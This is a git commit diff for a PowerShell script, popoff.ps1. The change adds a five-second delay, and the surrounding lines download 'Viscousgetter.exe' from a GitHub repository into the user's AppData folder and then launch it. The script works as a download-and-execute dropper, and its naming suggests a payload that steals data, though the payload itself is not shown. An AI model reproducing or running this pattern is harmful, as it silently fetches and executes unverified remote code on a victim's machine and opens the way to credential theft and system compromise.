c8dc2fbf51163eba8312152e199d8be0e2dd6b3e
Zyg0s <weizeeer@gmail.com>
2024-12-04 17:22:14 +0100

    Update popoff.ps1

--- popoff.ps1
+++ popoff.ps1
@@ -1,4 +1,5 @@
 $VIS = "https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Viscousgetter.exe"
 $VISPath = "$env:AppData\Viscousgetter.exe"
 Invoke-WebRequest -Uri $VIS -OutFile $VISPath
+Start-Sleep -Seconds 5
 Start-Process -FilePath $VISPath
